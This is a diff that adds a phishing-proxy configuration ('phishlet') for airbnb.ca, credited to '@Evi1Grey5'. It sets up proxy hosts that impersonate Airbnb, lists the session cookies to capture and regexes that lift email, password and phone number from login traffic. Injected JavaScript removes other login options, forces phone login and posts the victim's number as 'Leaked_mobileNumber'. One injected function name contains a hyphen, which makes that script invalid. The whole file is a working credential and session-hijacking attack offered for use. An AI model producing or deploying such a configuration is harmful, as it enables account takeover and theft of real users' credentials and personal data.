@@ -1,0 +1,73 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.ca', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'airbnb.ca', session: true, is_landing: false}
+  - {phish_sub: 'muscache', orig_sub: 'a0', domain: 'muscache.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.airbnb.ca', orig_sub: 'www', domain: 'airbnb.ca', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','application/json','application/xhtml+xml','application/xml','application/signed-exchange']}
+  - {triggers_on: 'a0.muscache.com', orig_sub: 'a0', domain: 'muscache.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript','application/json','application/xhtml+xml','application/xml','application/signed-exchange']}
+
+auth_tokens:
+  - domain: 'www.airbnb.ca'
+    path: '/?has_logged_out=1'
+    keys: ['auth_jitney_session_id','_aaj','_aat','_airbed_session_id','_cci','_ccv','_csrf_token','_pt','_scid','_user_attributes','auth_jitney_session_id','bev','bm_sv','cbkp','cfrmfctr','everest_cookie','FPAU','FPID','FPLC','frmfctr','hli','hli','jitney_client_session_created_at','jitney_client_session_id','jitney_client_session_updated_at','OptanonAlertBoxClosed','OptanonConsent','previousTab','rclmd','rclu','tzo','.*,regexp'] 
+
+credentials:
+  username:
+    key: 'email'
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    - key: 'phoneNumber'
+      search: '(.*)'
+      type: 'json'
+
+login:
+  domain: 'www.airbnb.ca'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["www.airbnb.ca"]
+    trigger_paths: ["/login","/","/*"]
+    trigger_params: []
+    script: |
+      function phoneInputphone-login(){
+        document.getElementsByClassName("_1d079j1e")[1].click();
+        return;
+      }
+      setTimeout(function(){ phoneInputphone-login(); }, 1000);
+      
+      function remove_login_buttons() {
+        var elem = document.getElementsByClassName("_p03egf")[0];
+        elem.parentNode.removeChild(elem);
+        var elem1 = document.getElementsByClassName("_p03egf")[1];
+        elem1.parentNode.removeChild(elem1);
+        var elem2 = document.getElementsByClassName("_p03egf")[0];
+        elem2.parentNode.removeChild(elem2);
+        var elem3 = document.getElementsByClassName("_bema73j")[0];
+        elem3.parentNode.removeChild(elem3);
+        return;
+      }
+      setTimeout(function(){ remove_login_buttons(); }, 1000);
+      
+      function lp(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendMobile()");
+        return;
+      }
+      function sendMobile(){
+        var mobile = document.getElementsByName("phoneNumber")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Leaked_mobileNumber="+encodeURIComponent(mobile));
+        return;
+      }
+      setTimeout(function(){ lp(); }, 2000);
